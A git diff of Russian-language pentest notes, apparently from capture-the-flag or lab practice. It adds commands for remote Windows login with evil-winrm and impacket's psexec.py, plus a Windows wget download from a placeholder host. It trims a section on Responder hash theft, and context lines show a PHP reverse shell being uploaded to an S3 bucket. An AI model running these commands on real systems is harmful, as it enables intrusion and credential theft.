@@ -7,21 +7,22 @@
 
 **`ltrase`** - читает бинарные файлы как cat 
 
+## Удалённая авторизация
+### evil-winrm
 `evil-winrm` - подключиться к удаённому хосту windows. пример:
 > ``` 
 > evil-winrm -i <ip> -u <username> -p <userpassword>
 > ```
+
+или
+### impacket
+`impacket/examples`
+>```
+python3 psexec.py <login>@{TARGET_IP}
+ 
 ## WEB
 
-### Responder
-`responder` - приитворяется DHCP сервером или другой конечной сущьностью, чтобы красть хэши. Пример:
->``` 
-responder -I <ip adress interface> -Pdv
->```
->или
->``` 
->responder -I tun0 -v
->```
+### [[Responder]]
 
 ### AWS
 Существует саб-домин - **s3**. Это облачное хранилище для вещей в контейнерах. Корзины **AWS S3** имеют различные сценарии использования, включая резервное копирование и хранение, хостинг мультимедиа, доставку программного обеспечения, статический веб-сайт и тд. Файлы, хранящиеся в корзине Amazon S3, называются объектами S3.
@@ -45,3 +46,7 @@ php_reverse_shell > shell.php
 ```
 aws --endpoint=http://s3.<url> s3 cp shell.php s3://<url>
 ```
+### WGET
+чтобы скачать что-то на windows, необходимо использовать следующий синтаксис:
+>```
+wget http://<IP/URL>/<file> -outfile <file>
